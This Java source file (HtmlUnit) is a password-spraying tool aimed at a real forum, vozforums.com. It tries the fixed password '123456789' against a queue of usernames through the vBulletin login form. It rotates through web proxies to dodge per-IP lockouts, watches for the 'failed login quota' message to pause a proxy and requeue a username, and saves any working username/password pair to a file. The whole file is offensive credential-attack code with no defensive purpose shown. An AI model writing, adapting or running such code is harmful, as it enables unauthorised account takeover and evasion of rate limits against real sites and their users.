import com.gargoylesoftware.htmlunit.BrowserVersion;
import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.TextPage;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlElement;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;

import java.util.Date;
import java.util.List;
import java.util.Queue;

/**
 * Created by Snoob on 4/11/2016.
 */
public class TryPass {

    public HtmlElement getSubmitBtn(List<?> list){
        for (HtmlElement e:(List<HtmlElement>) list) {
            String value = e.getAttribute("value");
            if(value.contains("Subscribe")) continue;
            if(value.contains("Register")) continue;
            if(value.contains("Sign up")) continue;
            return e;
        }
        return null;
    }
    public HtmlElement getURLInput(List<?> list){
        for (HtmlElement e:(List<HtmlElement>) list) {
            String name = e.getAttribute("name");
            if(name.contains("login")) continue;
            if(name.contains("email")) continue;
            return e;
        }
        return null;
    }
    public HtmlPage getPage(String Proxy, String pageUrl,WebClient webClient) throws Exception{
        webClient.getOptions().setCssEnabled(false);
        webClient.getOptions().setJavaScriptEnabled(false);
        webClient.getOptions().setRedirectEnabled(true);
        webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);
        webClient.getOptions().setThrowExceptionOnScriptError(false);
        webClient.getOptions().setUseInsecureSSL(true);
        HtmlPage page = null;
        try{
            page = webClient.getPage(Proxy);
        }catch (Exception e){
            page = null;
            return page;
        }
        HtmlInput input =  (HtmlInput) getURLInput(page.getByXPath("//input[@type='text']"));
        if(input == null) return null;
        input.setValueAttribute(pageUrl);
        HtmlElement go = getSubmitBtn(page.getByXPath("//*[@type='submit']"));
        try{
            page = go.click();
        }catch (Exception e){
            page = null;
            return page;
        }
        if(page.asText().contains("The site you are attempting to browse is on a secure connection")){
            HtmlSubmitInput submitBtn = (HtmlSubmitInput) page.getByXPath("//*[@type='submit']").get(0);
            page = submitBtn.click();
        }
        return page;
    }
    public TryPass(FileEntryWriter resultFile,Queue<ProxyInfo> proxyList, Queue<String> userNameList) throws Exception{
        Boolean notEndUpUsername = true;
        //For each proxy
        while(true) {
            ProxyInfo proxy = ProxyList.getBestProxy(proxyList);
            //In strick
            if(proxy.expire + 61*60*1000 >= System.currentTimeMillis()){
                //The best proxy is in strick
                long time = proxy.expire + 61*60*1000 - System.currentTimeMillis();
                System.out.println("No more proxy can works, sleep for" + (time/(60000)));
                Thread.sleep(time);
            }
            if(!notEndUpUsername) break;
            System.out.println("We will test with " + proxy.ProxyURL);
            Boolean notEndUpQuota = true;
            //We test a username
            HtmlPage page;
            while(notEndUpQuota) {
                if(proxy.nFail>4){
                    break;
                }
                WebClient webClient = new WebClient(BrowserVersion.CHROME);
                page = getPage(proxy.ProxyURL, "https://vozforums.com/index.php",webClient);
                if(page == null || !page.asText().contains("vozForums")){
                    proxy.nFail++;
                    webClient.close();
                    continue;
                }
                String user = null;
                synchronized (ProxyList.class) {
                    user = userNameList.poll();
                }
                String password = "123456789";
                if(user == null)
                {
                    notEndUpUsername = false;
                    webClient.close();
                    break;
                }
                HtmlInput usernameInput = null;
                try{
                    usernameInput = (HtmlInput) page.getByXPath("//input[@name='vb_login_username']").get(0);
                }
                catch (Exception e){
                    proxy.nFail++;
                    System.out.println("Can't found vb_login_username:");
                    System.out.println(page.asText());
                    webClient.close();
                    continue;
                }
                HtmlInput passwordInput = (HtmlInput) page.getByXPath("//input[@name='vb_login_password']").get(0);
                HtmlSubmitInput submit = (HtmlSubmitInput) page.getByXPath("//input[@type='submit' and @value='Log in']").get(0);
                usernameInput.setValueAttribute(user);
                passwordInput.setValueAttribute(password);
                HtmlPage result = null;
                Page mpage = null;
                try{
                    mpage = submit.click();
                    result = (HtmlPage)mpage;
                }catch (ClassCastException e){
                    //Something wrong here
                    proxy.nFail++;
                    userNameList.add(user);
                    webClient.close();
                    continue;
                }

                String pageText = result.asText();
                //Wrong password
                if(pageText.contains("You have entered an invalid username or password")){
                    webClient.close();
                    continue;
                }
                //End up quote
                else if(pageText.contains("You have used up your failed login quota")){
                    //Add for test later
                    userNameList.add(user);
                    proxy.expire = System.currentTimeMillis();
                    synchronized (ProxyList.class) {
                        proxyList.add(proxy);
                    }
                    notEndUpQuota = false;
                }
                //We have the right password here
                else if(pageText.contains("You last visited: ")) {
                    System.out.println("Login success");
                    System.out.println("User" + user );
                    System.out.println("Password" + password );
                    resultFile.insert(user + " @.@-@.@ " + password);
                    synchronized (ProxyList.class) {
                    proxyList.add(proxy);
                    }
                }
                //Something unknown
                else{
                    //If this site go wrong, just ignore it
                    proxy.nFail++;
                    webClient.close();
                    notEndUpQuota = false;
                }
            }
        }
    }
    public void Try(){

    }
}
